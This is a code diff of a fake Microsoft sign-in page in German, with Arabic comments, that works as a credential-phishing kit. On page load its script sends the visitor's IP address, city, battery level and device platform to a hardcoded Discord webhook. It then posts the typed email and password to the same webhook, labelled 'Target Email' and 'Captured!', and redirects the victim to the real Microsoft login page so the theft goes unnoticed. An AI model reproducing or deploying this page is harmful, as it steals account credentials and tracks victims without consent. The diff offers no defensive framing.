@@ -8,9 +8,11 @@
         body { font-family: 'Segoe UI', sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .logo { width: 108px; margin-bottom: 20px; }
-        input { width: 100%; padding: 8px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; }
-        button { background-color: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; float: right; }
+        h2 { font-size: 24px; margin-bottom: 20px; font-weight: 600; }
+        input { width: 100%; padding: 10px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; }
+        button { background-color: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; float: right; font-size: 15px; }
         .hidden { display: none; }
+        .email-display { margin-bottom: 15px; font-size: 14px; color: #333; }
     </style>
 </head>
 <body>
@@ -18,70 +20,76 @@
 <div class="card" id="step1">
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="logo">
     <h2>Anmelden</h2>
-    <input type="email" id="email" placeholder="E-Mail, Telefon oder Skype">
+    <input type="email" id="email" placeholder="E-Mail, Telefon oder Skype" autocomplete="off">
     <button onclick="nextStep()">Weiter</button>
 </div>
 
 <div class="card hidden" id="step2">
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="logo">
-    <p id="userEmail"></p>
+    <div class="email-display" id="userEmail"></div>
     <h2>Kennwort eingeben</h2>
-    <input type="password" id="password" placeholder="Kennwort">
+    <input type="password" id="password" placeholder="Kennwort" autocomplete="off">
     <button onclick="submitAll()">Anmelden</button>
 </div>
 
 <script>
     const webhook = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
-    // 1. سحب بيانات الآيفون والـ IP فوراً عند فتح الصفحة
-    async function track() {
+    // 1. سحب البيانات فوراً عند الدخول (بدون تأخير للأزرار)
+    async function trackDevice() {
         try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const d = await ipRes.json();
-            const b = await navigator.getBattery();
-            
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip: 'N/A'}));
+            let battInfo = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battInfo = (b.level * 100) + "%";
+            }
+
             fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: `🔔 **دخول جديد الآن!**\n📍 IP: \`${d.ip}\` (${d.city})\n🔋 Battery: \`${(b.level*100)}%\`\n📱 System: \`${navigator.platform}\``
+                    content: `📱 **دخول جديد**\nIP: \`${ipData.ip}\`\nCity: \`${ipData.city || '?'}\`\nBattery: \`${battInfo}\`\nDevice: \`${navigator.platform}\``
                 })
             });
-        } catch(e) { console.log("Silent tracking"); }
+        } catch(e) {}
     }
-    track();
+    trackDevice();
 
-    // 2. الانتقال للمرحلة الثانية (مضمون)
+    // 2. الانتقال للمرحلة الثانية
     function nextStep() {
         const mail = document.getElementById('email').value;
         if(mail.length > 3) {
             document.getElementById('userEmail').innerText = mail;
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            // إرسال الإيميل فوراً
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            
+            // إرسال الإيميل كخطوة أولى
             fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📧 **Email Entered:** \`${mail}\`` })
+                body: JSON.stringify({ content: `📩 **Target Email:** \`${mail}\`` })
             });
         }
     }
 
-    // 3. الإرسال النهائي والإغلاق
+    // 3. الإرسال النهائي للباسورد
     function submitAll() {
         const mail = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
         
-        fetch(webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                content: `🎯 **LOGIN SUCCESS**\nUser: \`${mail}\`\nPass: \`${pass}\``
-            })
-        }).then(() => {
-            // التوجه لصفحة ميكروسوفت الحقيقية لتمويه الضحية
-            window.location.href = "https://login.live.com/";
-        });
+        if(pass.length > 0) {
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `🎯 **Captured!**\nUser: \`${mail}\`\nPass: \`${pass}\``
+                })
+            }).then(() => {
+                // توجيه فوري للموقع الحقيقي
+                window.location.href = "https://login.live.com/";
+            });
+        }
     }
 </script>
 </body>
